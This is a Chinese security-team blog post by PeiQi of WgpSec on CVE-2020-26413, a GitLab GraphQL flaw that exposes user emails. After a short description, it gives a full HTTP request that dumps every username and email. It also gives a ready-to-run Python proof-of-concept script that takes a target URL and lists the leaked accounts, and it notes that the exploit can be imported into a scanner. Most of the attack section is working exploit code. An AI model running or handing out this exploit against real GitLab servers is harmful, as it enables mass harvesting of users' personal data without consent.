> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3cT8d9I7qru2tsURqUDusw)

**点击蓝字**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**关注我们**

  

  

**_声明  
_**

本文作者：PeiQi  
本文字数：1500

阅读时长：5min

附件/链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

  

**_前言_**

  

一、

**_漏洞描述_**

GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名

  

二、

**_漏洞影响_**

GitLab 13.4 - 13.6.2

  

三、

**_漏洞复现_**

看到了CNVD收录了一个漏洞 原编号为  CVE-2020-26413

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

发现最近 Hackone公开了 漏洞报告  

地址为 ：https://gitlab.com/gitlab-org/gitlab/-/issues/244275  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

意思为当使用构造的语句在接口查询时会返回邮箱信息，如图

访问 URL http://xxx.xxx.xxx.xxx/-//graphql-explorer

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

Gitlab本身不允许获取账号邮箱信息，这里通过调用 Graphql 用户名查询造成了邮箱泄露漏洞

查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在Graphql官网查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发包调用了 **/api/graphql** 接口发送数据

完整数据包为

```
`POST /api/graphql HTTP/1.1``Host: xxx.xxx.xxx.xxx``Content-Length: 212``Content-Type: application/json``{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功返回数据，造成 Gitlab的用户邮箱信息泄露

  

四、

**_漏洞POC_**

  

```
`import requests``import sys``import random``import re``import json``from requests.packages.urllib3.exceptions import InsecureRequestWarning``def title():` `print('+--------------WgpSec--Team----------------')` `print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')` `print('+  \033[34mVersion: GitLab 13.4 - 13.6.2                                     \033[0m')` `print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')` `print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')` `print('+------------------------------------------')``def POC_1(target_url):` `vuln_url = target_url + "/api/graphql"` `user_number = 0` `headers = {` `"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",` `"Content-Type": "application/json",` `}` `try:` `data = """` `{"query":"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }","variables":null,"operationName":null}` `"""` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5)` `if "email" in response.text and "username" in response.text and "@" in response.text and response.status_code == 200:` `print('\033[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... \033[0m'.format(target_url))` `for i in range(0,999):` `try:` `username = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["username"]` `email = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["email"]` `user_number = user_number + 1` `print('\033[34m[o] 用户名:{} 邮箱:{} \033[0m'.format(username, email))` `except:` `print("\033[32m[o] 共泄露{}名用户邮箱账号 \033[0m".format(user_number))` `sys.exit(0)` `else:` `print("\033[31m[x] 不存在漏洞 \033[0m")` `sys.exit(0)` `except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``if __name__ == '__main__':` `title()` `target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))` `POC_1(target_url)`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
`GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413``EXP放在文库中的 Goby & POC 目录中可一键导入Goby扫描` 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

**_作者_**

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

PeiQi

感谢观看啦~

  

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)